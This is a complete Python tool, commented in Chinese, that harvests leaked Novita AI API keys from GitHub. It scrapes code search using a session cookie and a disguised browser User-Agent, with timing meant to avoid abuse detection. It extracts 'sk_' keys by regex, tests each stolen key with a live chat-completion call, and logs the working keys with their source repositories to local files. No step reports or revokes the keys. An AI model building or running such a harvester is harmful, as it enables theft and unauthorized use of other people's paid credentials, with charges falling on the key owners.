#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
专门扫描sk_开头的Novita AI API密钥的并发扫描器
支持多线程并发搜索以提高扫描速度
"""

import os
import re
import time
import threading
import concurrent.futures
import random
from queue import Queue
import requests
from datetime import datetime

# 加载.env文件
try:
    from dotenv import load_dotenv
    load_dotenv()
    print("✅ 已加载.env文件")
except ImportError:
    print("⚠️ 未安装python-dotenv，将使用系统环境变量")

# --- 配置 ---
GITHUB_SESSION = os.getenv('GITHUB_SESSION')
if not GITHUB_SESSION:
    print("⚠️ 警告: 未设置 GITHUB_SESSION 环境变量，无法使用网页搜索模式。")
    print("   请在 .env 文件中配置 GITHUB_SESSION=your_cookie_here")
    # 为了兼容性，如果不设置Session，可以抛出错误或者尝试其他方式，这里强制要求Session
    raise ValueError("请设置 GITHUB_SESSION 环境变量 (GitHub user_session Cookie)")

# Novita AI API配置
NOVITA_API_URL = "https://api.novita.ai/v3/openai/v1/chat/completions"
SEARCH_REGEX = r'sk_[A-Za-z0-9]{43,44}'
NOVITA_MODELS = [
    "Sao10K/L3-8B-Stheno-v3.2",
    "baichuan/baichuan-m2-32b",
    "baidu/ernie-4.5-0.3b",
    "baidu/ernie-4.5-21B-a3b",
    "baidu/ernie-4.5-300b-a47b-paddle",
    "baidu/ernie-4.5-vl-28b-a3b",
    "baidu/ernie-4.5-vl-424b-a47b",
    "deepseek/deepseek-prover-v2-671b",
    "deepseek/deepseek-r1-0528",
    "deepseek/deepseek-r1-0528-qwen3-8b",
    "deepseek/deepseek-r1-distill-llama-70b",
    "deepseek/deepseek-r1-distill-llama-8b",
    "deepseek/deepseek-r1-distill-qwen-14b",
    "deepseek/deepseek-r1-distill-qwen-32b",
    "deepseek/deepseek-r1-turbo",
    "deepseek/deepseek-v3-0324",
    "deepseek/deepseek-v3-turbo",
    "deepseek/deepseek-v3.1",
    "google/gemma-3-12b-it",
    "google/gemma-3-1b-it",
    "google/gemma-3-27b-it",
    "gryphe/mythomax-l2-13b",
    "meta-llama/llama-3-70b-instruct",
    "meta-llama/llama-3-8b-instruct",
    "meta-llama/llama-3.1-8b-instruct",
    "meta-llama/llama-3.2-1b-instruct",
    "meta-llama/llama-3.2-3b-instruct",
    "meta-llama/llama-3.3-70b-instruct",
    "meta-llama/llama-4-maverick-17b-128e-instruct-fp8",
    "meta-llama/llama-4-scout-17b-16e-instruct",
    "microsoft/wizardlm-2-8x22b",
    "minimaxai/minimax-m1-80k",
    "mistralai/mistral-7b-instruct",
    "mistralai/mistral-nemo",
    "moonshotai/kimi-k2-0905",
    "moonshotai/kimi-k2-instruct",
    "nousresearch/hermes-2-pro-llama-3-8b",
    "openai/gpt-oss-120b",
    "openai/gpt-oss-20b",
    "qwen/qwen-2.5-72b-instruct",
    "qwen/qwen-mt-plus",
    "qwen/qwen2.5-7b-instruct",
    "qwen/qwen2.5-vl-72b-instruct",
    "qwen/qwen3-235b-a22b-fp8",
    "qwen/qwen3-235b-a22b-instruct-2507",
    "qwen/qwen3-235b-a22b-thinking-2507",
    "qwen/qwen3-30b-a3b-fp8",
    "qwen/qwen3-32b-fp8",
    "qwen/qwen3-4b-fp8",
    "qwen/qwen3-8b-fp8",
    "qwen/qwen3-coder-480b-a35b-instruct",
    "qwen/qwen3-next-80b-a3b-instruct",
    "qwen/qwen3-next-80b-a3b-thinking",
    "sao10k/l3-70b-euryale-v2.1",
    "sao10k/l3-8b-lunaris",
    "sao10k/l31-70b-euryale-v2.2",
    "sophosympatheia/midnight-rose-70b",
    "thudm/glm-4-32b-0414",
    "thudm/glm-4.1v-9b-thinking",
    "zai-org/glm-4.5",
    "zai-org/glm-4.5v"
]

# 并发配置
MAX_WORKERS = 5  # 最大并发线程数
API_DELAY = 1    # API请求间隔（秒）
MAX_RESULTS_PER_QUERY = 500  # 每个查询最多检查的结果数

# 存储结果的线程安全队列
live_keys_queue = Queue()
processed_keys = set()  # 防止重复处理相同密钥
lock = threading.Lock()
file_lock = threading.Lock() # 文件写入锁

# 实时保存文件名（全局变量）
live_keys_filename = None
simple_keys_filename = None

def get_headers():
    """构造 GitHub 搜索请求头"""
    return {
        "Cookie": f"user_session={GITHUB_SESSION}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    }

# --- 密钥验证函数 ---

def save_live_key_immediately(key_info):
    """实时保存存活密钥到文件"""
    global live_keys_filename, simple_keys_filename
    
    with file_lock:
        # 如果文件名还未初始化，创建文件名
        if live_keys_filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            live_keys_filename = f'novita_live_keys_{timestamp}.txt'
            simple_keys_filename = f'novita_keys_simple_{timestamp}.txt'
            
            # 创建详细文件的头部
            with open(live_keys_filename, 'w', encoding='utf-8') as f:
                f.write("=== Novita AI API密钥扫描结果 (实时更新) ===\n")
                f.write(f"扫描开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"API端点: {NOVITA_API_URL}\n")
                f.write(f"测试模型: google/gemma-3-1b-it\n")
                f.write("=" * 60 + "\n\n")
            
            # 创建简化文件的头部
            with open(simple_keys_filename, 'w', encoding='utf-8') as f:
                f.write("=== Novita AI API密钥列表 (实时更新) ===\n")
                f.write(f"扫描开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 40 + "\n\n")
        
        # 追加详细信息到详细文件
        with open(live_keys_filename, 'a', encoding='utf-8') as f:
            f.write(f"🔑 {key_info['type']}\n")
            f.write(f"   密钥: {key_info['key']}\n")
            f.write(f"   状态: {key_info['status']}\n")
            f.write(f"   仓库: {key_info['repo']}\n")
            f.write(f"   文件: {key_info['file_path']}\n")
            f.write(f"   链接: {key_info['url']}\n")
            f.write(f"   发现时间: {key_info['discovered_time']}\n")
            f.write(f"   处理线程: Worker-{key_info['worker_id']}\n")
            f.write("-" * 60 + "\n")
        
        # 追加密钥到简化文件
        with open(simple_keys_filename, 'a', encoding='utf-8') as f:
            f.write(f"{key_info['key']}\n")
        
        print(f"💾 已实时保存密钥到: {live_keys_filename}")

def check_novita_key(key):
    """验证Novita AI API密钥是否有效"""
    if not key.startswith("sk_"):
        return "无效格式"
    
    try:
        headers = {
            "Authorization": f"Bearer {key}",
            "Content-Type": "application/json"
        }
        
        # 使用一个轻量级的模型进行测试
        test_model = "google/gemma-3-1b-it"  # 选择一个较小的模型
        
        data = {
            "model": test_model,
            "messages": [
                {
                    "role": "user",
                    "content": "Hi"
                }
            ],
            "max_tokens": 1,
            "temperature": 0.1
        }
        
        response = requests.post(
            NOVITA_API_URL,
            headers=headers,
            json=data,
            timeout=30
        )
        
        if response.status_code == 200:
            return "🟢 存活 (Live)"
        elif response.status_code == 401:
            return "🔴 无效/已吊销 (Invalid/Revoked)"
        elif response.status_code == 429:
            return "🟡 存活但超出配额 (Live but Rate-Limited)"
        elif response.status_code == 403:
            return "🟡 存活但权限不足 (Live but Permission Denied)"
        else:
            return f"⚪ 未知状态码 (Status Code): {response.status_code}"
            
    except requests.exceptions.Timeout:
        return "⚪ 请求超时 (Timeout)"
    except requests.exceptions.RequestException as e:
        return f"⚪ 网络错误 (Network Error): {str(e)}"
    except Exception as e:
        return f"⚪ 未知错误 (Unknown Error): {str(e)}"

def process_file_url(file_url, worker_id):
    """处理单个文件URL，下载内容并提取API密钥"""
    try:
        # 构造Raw URL
        if "github.com" in file_url and "/blob/" in file_url:
            # 将HTML URL转换为Raw URL
            raw_url = file_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
        else:
            raw_url = file_url
            
        try:
            resp = requests.get(raw_url, timeout=15)
            if resp.status_code != 200:
                return
            
            file_content = resp.text
        except Exception as e:
            print(f"[Worker-{worker_id}] ❌ 下载出错: {e}")
            return
        
        # 使用正则表达式提取sk_密钥（Novita格式）
        potential_keys = re.findall(SEARCH_REGEX, file_content)
        
        for key in potential_keys:
            with lock:
                if key in processed_keys:
                    continue
                processed_keys.add(key)
            
            # 验证密钥
            status = check_novita_key(key)
            print(f"[Worker-{worker_id}] 🔑 发现密钥: {key[:20]}... | 状态: {status}")
            
            # 如果密钥存活，立即保存并添加到队列（只保存完全存活的密钥）
            if "🟢 存活" in status:
                # 从URL中解析仓库信息
                repo_match = re.search(r'githubusercontent\.com/([^/]+/[^/]+)', raw_url)
                repo_name = repo_match.group(1) if repo_match else "unknown/repo"

                key_info = {
                    'type': 'Novita AI Key',
                    'key': key,
                    'status': status,
                    'url': file_url,
                    'repo': repo_name,
                    'file_path': raw_url,
                    'discovered_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'worker_id': worker_id
                }
                
                # 实时保存到文件
                save_live_key_immediately(key_info)
                
                # 同时添加到队列（用于最终统计）
                live_keys_queue.put(key_info)
                print(f"[Worker-{worker_id}] ✅ 已实时保存并记录存活密钥")
            
            # 添加延迟以避免API速率限制
            time.sleep(API_DELAY)
            
    except Exception as e:
        print(f"[Worker-{worker_id}] ❌ 处理文件时出错: {e}")

def search_github_session(query, max_pages=5):
    """使用Session搜索GitHub，返回文件链接列表"""
    found_links = set()
    
    print(f"📡 执行搜索查询: {query}")
    
    for page in range(1, max_pages + 1):
        params = {
            'q': query,
            'type': 'code',
            'p': page,
            'o': 'desc',
            's': 'indexed'
        }
        url = "https://github.com/search"
        
        try:
            resp = requests.get(url, headers=get_headers(), params=params, timeout=30)
            
            if resp.status_code != 200:
                print(f"   ❌ 请求失败 Page {page}: HTTP {resp.status_code}")
                if resp.status_code == 429:
                    print("   ⚠️ 触发频控，暂停 60 秒...")
                    time.sleep(60)
                break
            
            if "Sign in to GitHub" in resp.text or "Wait a few minutes before you try again" in resp.text:
                print("   ❌ Session失效 或 触发 Abuse Detection")
                break
                
            # 提取链接
            links = re.findall(r'href="(/[^\s"\'<>]+/blob/[^\s"\'<>]+?)(?:#L\d+)?"', resp.text)
            
            # 如果没有链接，尝试另一种正则
            if not links:
                links_v2 = re.findall(r'href="(/[^\s"]+/blob/(?:[^"]+)?)#L\d+"', resp.text)
                if links_v2:
                    links.extend(links_v2)
            
            if not links:
                if page == 1:
                    print(f"   ⚠️ Page 1 无结果。")
                break
            
            unique_links_page = set()
            for link in links:
                clean_link = link.split('#')[0]
                if clean_link.endswith(".md") or clean_link.endswith(".txt"):
                    continue
                full_link = "https://github.com" + clean_link
                unique_links_page.add(full_link)
            
            print(f"   Page {page}: 找到 {len(unique_links_page)} 个结果")
            found_links.update(unique_links_page)
                
            # 翻页延迟
            time.sleep(random.uniform(2, 4))
            
        except Exception as e:
            print(f"   ❌ 搜索出错: {e}")
            break
            
    return list(found_links)

def concurrent_search_and_validate():
    """并发搜索和验证sk_密钥"""
    print(f"🚀 开始并发搜索Novita AI sk_密钥 (并发数: {MAX_WORKERS})")
    print(f"ℹ️ 使用 GitHub Session 网页搜索模式")
    print("=" * 60)
    
    # 定义搜索查询
    search_queries = [
        '/sk_[A-Za-z0-9]{43,44}/ novita',
        '/sk_[A-Za-z0-9]{43,44}/ api.novita.ai',
    ]
    
    all_file_urls = set()
    
    # 收集所有搜索结果
    for query in search_queries:
        urls = search_github_session(query, max_pages=5)
        print(f"   👉 查询 '{query}' 找到 {len(urls)} 个文件")
        all_file_urls.update(urls)
        time.sleep(2)
    
    file_list = list(all_file_urls)
    print(f"🗂️ 去重后共 {len(file_list)} 个唯一文件需要处理")
    
    # 使用线程池并发处理文件
    if file_list:
        print(f"⚡ 启动 {MAX_WORKERS} 个工作线程进行并发处理...")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            # 提交所有任务
            future_to_url = {}
            for i, url in enumerate(file_list):
                worker_id = (i % MAX_WORKERS) + 1
                future = executor.submit(process_file_url, url, worker_id)
                future_to_url[future] = url
            
            # 等待所有任务完成
            completed = 0
            total = len(file_list)
            for future in concurrent.futures.as_completed(future_to_url):
                completed += 1
                if completed % 10 == 0 or completed == total:
                    print(f"📊 进度: {completed}/{total} ({(completed/total)*100:.1f}%)")
                try:
                    future.result()
                except Exception as e:
                    url = future_to_url[future]
                    print(f"❌ 处理任务失败: {url} - {e}")
    
    print("\n✅ 所有文件处理完成")

def save_results():
    """保存扫描结果统计信息"""
    live_keys = []
    
    # 从队列中获取所有结果
    while not live_keys_queue.empty():
        live_keys.append(live_keys_queue.get())
    
    if live_keys:
        # 由于已经实时保存，这里只需要更新实时文件的统计信息
        global live_keys_filename
        if live_keys_filename:
            with file_lock:
                with open(live_keys_filename, 'a', encoding='utf-8') as f:
                    f.write(f"\n{'='*60}\n")
                    f.write(f"扫描完成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"总计发现存活密钥: {len(live_keys)} 个\n")
                    f.write(f"并发线程数: {MAX_WORKERS}\n")
                    f.write(f"处理的唯一密钥数: {len(processed_keys)}\n")
                    f.write(f"{'='*60}\n")
            
            print(f"\n📊 已更新统计信息到: {live_keys_filename}")
        
        # 同时更新通用的live_keys.txt文件
        with open('live_keys.txt', 'a', encoding='utf-8') as f:
            f.write(f"\n=== Novita AI密钥扫描结果 (实时保存) ===\n")
            f.write(f"扫描时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"发现存活密钥: {len(live_keys)} 个\n")
            f.write("-" * 50 + "\n")
            for key_info in live_keys:
                f.write(f"密钥: {key_info['key']}\n")
                f.write(f"状态: {key_info['status']}\n")
                f.write(f"仓库: {key_info['repo']}\n")
                f.write(f"链接: {key_info['url']}\n")
                f.write("-" * 30 + "\n")
        
        print(f"📝 同时追加结果到 live_keys.txt")
        print(f"💾 实时保存的详细文件: {live_keys_filename}")
        print(f"💾 实时保存的简化文件: {simple_keys_filename}")
    else:
        print("\n📝 未发现存活的Novita AI密钥")

def main():
    """主函数"""
    print("🔍 Novita AI API密钥并发扫描器")
    print("=" * 50)
    print(f"⚙️ 配置:")
    print(f"   - API端点: {NOVITA_API_URL}")
    print(f"   - 支持模型数量: {len(NOVITA_MODELS)}")
    print(f"   - 最大并发线程数: {MAX_WORKERS}")
    print(f"   - API请求延迟: {API_DELAY}秒")
    print(f"   - 每个查询最大结果数: {MAX_RESULTS_PER_QUERY}")
    print("=" * 50)
    
    start_time = time.time()
    
    try:
        print("\n🚀 开始扫描...")
        
        # 执行并发搜索和验证
        concurrent_search_and_validate()
        
        # 保存结果
        save_results()
        
        end_time = time.time()
        elapsed_time = end_time - start_time
        
        print(f"\n🏁 扫描完成!")
        print(f"⏱️ 总耗时: {elapsed_time:.2f}秒")
        print(f"🔧 处理的唯一密钥数: {len(processed_keys)}")
        print(f"✅ 发现存活密钥数: {live_keys_queue.qsize()}")
        
    except KeyboardInterrupt:
        print("\n🛑 用户中断扫描")
        save_results()  # 保存已找到的结果
    except Exception as e:
        print(f"\n❌ 扫描过程中发生错误: {e}")
        save_results()  # 保存已找到的结果

if __name__ == '__main__':
    main()
